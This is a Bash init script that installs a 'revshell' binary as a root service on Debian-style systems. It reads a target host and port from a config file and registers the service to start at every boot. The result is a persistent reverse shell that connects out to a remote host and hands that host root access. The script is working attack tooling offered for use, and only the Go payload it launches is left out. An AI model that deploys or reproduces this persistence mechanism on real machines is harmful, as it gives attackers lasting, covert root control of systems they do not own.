#!/bin/bash

### BEGIN INIT INFO
# Provides:          Reverse Shell Daemon
# Required-Start:    $local_fs $network $syslog
# Required-Stop:     $local_fs $network $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Reverse Shell 
# Description:       Reverse Shell start-stop-daemon - Debian
### END INIT INFO

NAME="revshell_service"
PATH="/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin"
APPDIR="/"
APPBIN="/usr/bin/revshell"
APPARGS="$(head -n1 /etc/revshell/config.txt) $(tail -n1 /etc/revshell/config.txt)"
USER="root"
GROUP="root"

# Include functions 
set -e
. /lib/lsb/init-functions

install() {
  if [ "$EUID" -ne 0 ]
    then echo "Please run as root"
    exit
  fi
    
  if [ ! -f revshell ]
    then echo "Please first compile revshell binary with 'go build revshell.go'"
    exit
  fi

  if [ ! $(cat config.txt | wc -l) -eq 2 ]
    then echo "Please insert into config.txt first line the target and in the secon line the port"
    echo "example Content can be:"
    echo "  example.com"
    echo "  9999"
    exit 
  fi
    
   
  echo "reverse shell will be run as follows:"
  echo "    $APPBIN $APPARGS"

  echo "creating /etc/revshell directory"
  mkdir /etc/revshell
  echo "copying config.txt into /etc/revshell"
  cp ./config.txt /etc/revshell/config.txt

  echo "Copying the revshell binary into the /usr/bin/ folder"
  cp ./revshell /usr/bin/
 
  echo "Installing the file $0 into /etc/init.d/revshell_service"
  cp $0 /etc/init.d/revshell_service

  echo "Running update-rc.d to run revshell_service at startup"
  update-rc.d revshell_service defaults

  echo "Actually starting service"
  service revshell_service start


  echo "Status follows"
  service revshell_service status
  echo "Done."
}

uninstall() {
  if [ "$EUID" -ne 0 ]
    then echo "Please run as root"
    exit
  fi
  echo "Stopping the revshell_service service"
  service revshell_service stop
  echo "Disabling revshell_service at startup"
  update-rc.d -f revshell_service remove
  echo "Removing /etc/init.d/revshell_service and /usr/bin/revshell"
  rm /etc/init.d/revshell_service /usr/bin/revshell
  echo "Removing /etc/revshell directory"
  rm /etc/revshell -r

  echo "Done."  
}

start() {
  printf "Starting '$NAME'... "
  start-stop-daemon --start --chuid "$USER:$GROUP" --background --make-pidfile --pidfile /var/run/$NAME.pid --chdir "$APPDIR" --exec "$APPBIN" -- $APPARGS || true
  printf "done\n"
}

#We need this function to ensure the whole process tree will be killed
killtree() {
    local _pid=$1
    local _sig=${2-TERM}
    for _child in $(ps -o pid --no-headers --ppid ${_pid}); do
        killtree ${_child} ${_sig}
    done
    kill -${_sig} ${_pid}
}

stop() {
  printf "Stopping '$NAME'... "
  [ -z `cat /var/run/$NAME.pid 2>/dev/null` ] || \
  while test -d /proc/$(cat /var/run/$NAME.pid); do
    killtree $(cat /var/run/$NAME.pid) 15
    sleep 0.5
  done 
  [ -z `cat /var/run/$NAME.pid 2>/dev/null` ] || rm /var/run/$NAME.pid
  printf "done\n"
}

status() {
  status_of_proc -p /var/run/$NAME.pid "" $NAME && exit 0 || exit $?
}

case "$1" in
  install)
    install
    ;;
  uninstall)
    uninstall
    ;;
  start)
    start
    ;;
  stop)
    stop
    ;;
  restart)
    stop
    start
    ;;
  status)
    status
    ;;
  *)
    echo "Usage: $NAME {install|uninstall|start|stop|restart|status}" >&2
    exit 1
    ;;
esac

exit 0
